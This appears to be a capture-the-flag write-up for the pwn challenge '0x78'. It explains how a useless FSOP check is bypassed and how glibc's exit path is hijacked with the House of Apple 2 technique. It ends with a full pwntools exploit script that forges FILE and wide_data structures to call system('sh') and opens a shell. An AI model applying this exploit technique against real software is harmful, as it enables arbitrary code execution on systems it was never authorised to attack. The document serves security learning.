# 0x78 — Pwn Chall Writeup

**Challenge Name:** `0x78`  
**Port:** `tjc.tf:31378`

---

## Analysis

The binary prompts with:

```
I'm trying to test my FSOP prevention mechanism so I can share it with
my coworkers who know nothing about security. It should be foolproof right?

Here's the address of the File Structure: 0x...

I'm pretty confident you can't break out of this, so I'll give you a
libc leak as well: 0x...
```

It helpfully leaks both the **FILE struct address** and a **libc address** (puts@GOT).  
The key program flow in `Ox78()` is:

```
1. malloc(0x78)                         → testbuf
2. fopen("/tmp/test.txt", "r")          → fp  (global)
3. printf(fp address leak)
4. printf(puts@GOT leak)
5. read(0, fp, 0x78)                    ← We write 0x78 bytes to the FILE struct
6. prevent_fsop()                       ← "FSOP prevention" (useless)
7. fread(testbuf, 1, 0x78, fp)         ← Reads from FILE into testbuf
8. prevent_fsop()                       ← Same useless check
9. return → exit
```

We get **two writes** into the FILE struct:

| Write | Source | Size | Destination |
|-------|--------|------|-------------|
| #1 | `read(0, fp, 0x78)` | 0x78 (120) bytes | `fp[0x00..0x77]` |
| #2 | fread's internal `read(fp->_fileno, _IO_buf_base, bufsz)` | up to `_IO_buf_end - _IO_buf_base` | `_IO_buf_base` onward |

## Vulnerability

The `prevent_fsop()` function is completely useless:

```c
void prevent_fsop() {
    void *wd = fp->_wide_data;    // read from fp+0xa0
    void *vt = fp->vtable;        // read from fp+0xd8
    // Re-read and compare — always matches in single-threaded code
    if (fp->_wide_data != wd || fp->vtable != vt)
        *(int*)0 = 1;             // crash (never reached)
    fp->_chain = NULL;            // at fp+0x68 (not even _lock!)
}
```

The fields checked (`_wide_data` at `fp+0xa0` and `vtable` at `fp+0xd8`) are **beyond** our 0x78-byte first write, so they retain their original fopen values. The re-read always matches the save. The only "protection" is zeroing `fp+0x68` (`_chain`) — which doesn't prevent FSOP at all.

## Exploitation Strategy

We need to get **arbitrary code execution** via **FSOP (File Stream Oriented Programming)**.  
Our goal: call `system("sh")`.

### House of Apple 2

The key call chain in glibc's exit path is:

```
_exit → _IO_flush_all_lockp
  → _IO_OVERFLOW(fp, EOF)
    → vtable->__overflow(fp, EOF)      = _IO_wfile_overflow
      → _IO_wdoallocbuf(fp)
        → wide_data->_wide_vtable->__doallocate(fp)   ← CODE EXECUTION!
```

For this to trigger, three conditions must be met:

1. **`_IO_flush_all_lockp` condition** (exit path):
   ```c
   _vtable_offset(fp) == 0 && fp->_mode > 0
       && fp->_wide_data->_IO_write_ptr > fp->_wide_data->_IO_write_base
   ```

2. **`_IO_wfile_overflow` pre-check**:
   ```c
   if (fp->_wide_data->_IO_write_base == NULL)
       _IO_wdoallocbuf(fp);
   ```

3. **`_IO_wdoallocbuf` pre-checks**:
   ```c
   if (fp->_wide_data->_IO_buf_base == NULL)     // continue
   if (!(fp->_flags & _IO_UNBUFFERED))           // not set → continue
   // then calls: wide_data->_wide_vtable[0x68](fp)
   ```

### Getting a Second Write Beyond 0x78

The first `read(0, fp, 0x78)` only lets us corrupt `fp[0x00..0x77]`.  
But `_wide_data` is at `fp+0xa0` and `vtable` is at `fp+0xd8` — both out of reach.

The **trick**: set `_fileno = 0` (stdin) in the first write. Then fread's internal `_IO_file_underflow` calls:

```c
read(fp->_fileno, fp->_IO_buf_base, fp->_IO_buf_end - fp->_IO_buf_base)
// = read(0, buf_base, buf_size)
```

If we set `_IO_buf_base = fp + 0xa0`, fread reads from stdin **into** `fp+0xa0`, giving us a second payload that controls `_wide_data`, `vtable`, and beyond.

### The Problem with the Naive Approach

When `_IO_file_underflow` runs during fread, it executes this critical code:

```asm
movdqu 0x38(%rbx), %xmm0        ; load [buf_base, buf_end]
punpcklqdq %xmm0, %xmm0         ; duplicate: [buf_base, buf_base]
movups %xmm0, 0x08(%rbx)        ; fp[0x08..0x17] = buf_base (repeated)
movups %xmm0, 0x18(%rbx)        ; fp[0x18..0x27] = buf_base (repeated)
movups %xmm0, 0x28(%rbx)        ; fp[0x28..0x37] = buf_base (repeated)
```

This **destroys** `fp[0x08..0x37]`, setting them all to `buf_base`.  
If we set `_wide_data = fp` (the naive approach), then:

- `wide_data->_IO_write_base = *(fp + 0x18) = buf_base ≠ 0` → **condition 2 fails**
- `wide_data->_IO_write_ptr = *(fp + 0x20) = buf_base`
- `ptr == base` → **`_IO_flush_all_lockp` never triggers overflow!**

### The Fix: Shifting `_wide_data`

Instead of setting `_wide_data = fp`, we set **`_wide_data = fp + 0xa0`**.

The `_IO_file_underflow` only touches `fp[0x08..0x37]` — **not** `fp[0x38+]`.  
With `_wide_data = fp + 0xa0`, the wide_data fields are:

| wide_data member | wide_data offset | FILE offset | Set by |
|---|---|---|---|
| `_IO_write_base` | `+0x18` | `fp+0xb8` = `__pad5` | Payload 2 → **= 0** ✅ |
| `_IO_write_ptr` | `+0x20` | `fp+0xc0` = `_mode` | Payload 2 → **= 1** ✅ |
| `_IO_buf_base` | `+0x30` | `fp+0xd0` = `_unused2` | Payload 2 → **= 0** ✅ |
| `_wide_vtable` | `+0xe0` | `fp+0x180` | Payload 2 → **fake vtable** ✅ |

All these fields are **untouched** by `_IO_file_underflow` — they live beyond offset `0x37`.

To reach `fp+0x180` (where `_wide_vtable` lives), we need a buffer larger than `0x78` bytes.  
We set `_IO_buf_end = fp + 0xa0 + 0xf8` and send a `0xe8`-byte payload 2.

## Full Call Chain

```
exit()
└─ _IO_flush_all_lockp()
   └─ Condition check:
      fp->_mode = 1 > 0
      wide_data = fp+0xa0
      wide_data->_IO_write_ptr  (fp+0xc0) = 1
      wide_data->_IO_write_base (fp+0xb8) = 0
      1 > 0 → TRUE → call _IO_OVERFLOW(fp, EOF)
      └─ vtable (fp+0xd8) = _IO_wfile_jumps
         └─ __overflow = _IO_wfile_overflow
            └─ wide_data->_IO_write_base (fp+0xb8) == 0 → TRUE
               └─ call _IO_wdoallocbuf(fp)
                  └─ wide_data->_IO_buf_base (fp+0xd0) == 0 → continue
                  └─ flags & _IO_UNBUFFERED == 0 → continue
                  └─ wide_vtable = *(fp+0x180) = fp+0xa0
                  └─ call *(fp+0xa0 + 0x68) = *(fp+0x108) = system
                     └─ system("  sh") → shell!
```

## Exploit Script

```python
#!/usr/bin/env python3
from pwn import *
context.arch = 'amd64'

PUTS_OFF = 0x84ed0
SYSTEM_OFF = 0x54ae0
IO_WFILE_JUMPS_OFF = 0x21a020

r = remote('tjc.tf', 31378)

# ── Leaks ──
r.recvuntil(b'File Structure: 0x')
fp_addr = int(r.recvline().strip(), 16)

r.recvuntil(b'libc leak as well: ')
leak = r.recvline().strip()
libc_base = int(leak, 16) - PUTS_OFF

system_addr = libc_base + SYSTEM_OFF
io_wfile_jumps = libc_base + IO_WFILE_JUMPS_OFF

# ── Payload 1: 0x78 bytes into FILE struct ──
# Set _fileno=0 (stdin), buf_base=fp+0xa0, and buf_end large enough
p1  = p32(0x68732020)                # fp+0x00: _flags = "  sh"
p1 += p32(0)                          # fp+0x04: padding
p1 += p64(0) * 6                     # fp+0x08..0x37: buffer pointers
p1 += p64(fp_addr + 0xa0)            # fp+0x38: _IO_buf_base = fp+0xa0
p1 += p64(fp_addr + 0xa0 + 0xf8)     # fp+0x40: _IO_buf_end (large buffer)
p1 += p64(0) * 6                     # fp+0x48..0x77: save_base..flags2

# ── Payload 2: fread reads from stdin into fp+0xa0 (0xe8 bytes) ──
# wide_data = fp+0xa0 → fields at fp+0xb8+ (beyond underflow corruption)
p2  = p64(fp_addr + 0xa0)            # [0x00] _wide_data = fp+0xa0
p2 += p64(0)                          # [0x08] _freeres_list
p2 += p64(0)                          # [0x10] _freeres_buf
p2 += p64(0)                          # [0x18] __pad5 (wide_data._IO_write_base=0)
p2 += p64(1)                          # [0x20] _mode (wide_data._IO_write_ptr=1)
p2 += p64(0)                          # [0x28] (wide_data._IO_write_end)
p2 += p64(0)                          # [0x30] (wide_data._IO_buf_base=0)
p2 += p64(io_wfile_jumps)            # [0x38] vtable = _IO_wfile_jumps
p2 += p64(0) * 5                     # [0x40-0x60] padding
p2 += p64(system_addr)               # [0x68] __doallocate = system
p2 += p64(0) * 14                    # [0x70-0xd8] padding
p2 += p64(fp_addr + 0xa0)            # [0xe0] _wide_vtable = fp+0xa0

r.send(p1)
sleep(0.5)
r.send(p2)

sleep(1)
r.sendline(b'cat flag.txt')
r.interactive()
```

## Flag

```
tjctf{d0uBl3_FSoP_1s_fUN_29391}
```
